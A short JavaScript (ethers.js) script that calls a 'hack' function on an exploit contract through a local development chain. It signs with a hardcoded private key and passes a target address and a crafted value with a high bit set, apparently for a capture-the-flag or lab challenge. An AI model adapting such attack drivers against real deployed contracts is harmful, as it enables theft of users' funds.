const fs = require('fs');
const { ethers } = require('ethers');

const provider = new ethers.JsonRpcProvider('http://localhost:8545');
const privateKey = '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80';
const wallet = new ethers.Wallet(privateKey, provider);

const abi = JSON.parse(fs.readFileSync('build/Hack.abi', 'utf8'));

const contractAddress = '0xe8D2A1E88c91DCd5433208d4152Cc4F399a7e91d';

const contract = new ethers.Contract(contractAddress, abi, wallet);


contract.on("Attempt", (msg,succ) => {
  console.log("Attempt:", msg,succ);
});

async function main() {
    try {
      const tx = await contract.hack(
        "0x5E3d0fdE6f793B3115A9E7f5EBC195bbeeD35d6C",
        ((1n << 63n) | 0x00002266n)
      ); 
      await tx.wait();
      console.log(tx);
    } catch(err) {
      console.log(err.reason || err.message);
    }
}

main().catch(console.error);
